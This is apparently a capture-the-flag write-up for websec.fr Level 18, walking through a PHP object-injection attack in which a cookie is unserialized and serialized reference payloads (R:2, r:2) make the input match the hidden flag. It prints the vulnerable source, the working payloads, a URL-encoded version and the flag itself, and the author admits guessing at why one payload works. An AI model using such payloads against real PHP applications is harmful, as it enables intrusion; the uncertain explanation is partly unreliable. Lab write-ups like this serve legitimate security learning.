# Level 18

1. First, lets check what is written in https://websec.fr/level18/source.php
2. Then, we can find out 
    ```
    <?php
        $obj = $_COOKIE['obj'];
        $unserialized_obj = unserialize ($obj);
        $unserialized_obj->flag = $flag;  
        if (hash_equals ($unserialized_obj->input, $unserialized_obj->flag))
            echo '<div class="alert alert-success">Here is your flag: <mark>' . $flag . '</mark>.</div>';   
        else 
            echo '<div class="alert alert-danger"><code>' . htmlentities($obj) . '</code> is an invalid object, sorry.</div>';
    ?>
    ```
    It is really similar to level 20, as we know php object injection, so we can check the website : https://www.evonide.com/fuzzing-unserialize/ again and see what we need in this challenge. 
3. Now, lets type something like "123" and we will get the information :
    ```
    O:8:"stdClass":1:{s:5:"input";i:1234;} is an invalid object, sorry.
    ```
    As we can see in the php code above, we have to match flag and input to get the flag, and here is a good news : php do support reference. Lets take a look at the chart "r" and "R" and see what it means. 
4. So, here is the payload I think : 
    ```
    O:8:"stdClass":2:{s:4:"flag";i:1234;s:5:"input";R:2;}
    ```
    and
    ```
    O:8:"stdClass":2:{s:4:"flag";i:1234;s:5:"input";r:2;}
    ```
5. So, here is a little bit different between "r" and "R" that "R" set "[zval](http://www.phpinternalsbook.com/php5/zvals.html)" attribute. As we can see, we have no idea what the attibute of "$flag" is, so we have to set zval and pass hash_equal(). In fact, I tried the payload both and guess the result. I will modify the repo if I know the correct answer. By the way, you have to convert the payload above into 
    ```
      O%3A8%3A%22stdClass%22%3A2%3A%7Bs%3A4%3A%22flag%22%3Bi%3A1234%3Bs%3A5%3A%22input%22%3BR%3A2%3B%7D
    ```
    by [urlencoder](https://www.urlencoder.org/), change the cookie and get the flag.
6. Here is the flag : WEBSEC{You_have_impressive_refrences._We'll_call_you_back.}
